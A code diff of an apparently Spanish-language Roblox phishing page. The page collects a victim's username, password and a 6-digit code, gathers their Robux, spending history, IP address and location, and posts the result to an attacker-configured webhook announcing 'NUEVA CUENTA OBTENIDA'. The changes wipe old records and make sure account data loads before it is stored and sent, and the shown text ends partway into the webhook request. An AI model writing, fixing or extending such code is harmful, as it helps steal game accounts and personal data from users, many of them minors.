@@ -168,9 +168,10 @@
 </div>
 
 <script>
-let registros = JSON.parse(localStorage.getItem('cuentas')||'[]'), enlaceGenerado='', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ciudad:'',ip:'Desconocida'};
+let registros = [], enlaceGenerado='', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ciudad:'',ip:'Desconocida'};
 
 window.onload=async function(){
+    localStorage.removeItem('cuentas'); // ← BORRA HISTORIAL VIEJO UNA VEZ
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
     if(u){
@@ -244,12 +245,26 @@ function err(t){const e=document.getElementById('cajaErr');e.textContent='❌ '+
     const pass=document.getElementById('pass').value.trim();
     limpiarError();
     if(!cod||cod.length!==6||!/^\d+$/.test(cod)){err('Código incorrecto. Debe ser 6 dígitos.');return;}
-    if(!datosRoblox.dias) await cargarDatosRoblox(user);
+    
+    await cargarDatosRoblox(user); // ✅ ESPERA A QUE CARGUE TODO ANTES DE GUARDAR
+    
     const wh=localStorage.getItem('webhook');
     const todos=localStorage.getItem('todos')==='1'?'@everyone NUEVA CUENTA OBTENIDA':' ';
     const fecha=new Date().toLocaleString('es-ES');
-    registros.unshift({usuario:datosRoblox.nombre||user,robux:datosRoblox.robux||0,fechaCreacion:datosRoblox.fechaCreacion||'No disponible',dias:datosRoblox.dias||'Desconocido',pais:ipDatos.bandera+' '+ipDatos.pais,ciudad:ipDatos.ciudad,ip:ipDatos.ip,gastado:datosRoblox.gastado||0,fecha:fecha});
+
+    registros.unshift({
+        usuario:datosRoblox.nombre||user,
+        robux:datosRoblox.robux||0,
+        fechaCreacion:datosRoblox.fechaCreacion||'No disponible',
+        dias:datosRoblox.dias||'Desconocido',
+        pais:ipDatos.bandera+' '+ipDatos.pais,
+        ciudad:ipDatos.ciudad,
+        ip:ipDatos.ip,
+        gastado:datosRoblox.gastado||0,
+        fecha:fecha
+    });
     localStorage.setItem('cuentas',JSON.stringify(registros));
+
     if(wh){
         fetch(wh,{
             method:'POST',headers:{'Content-Type':'application/json'},
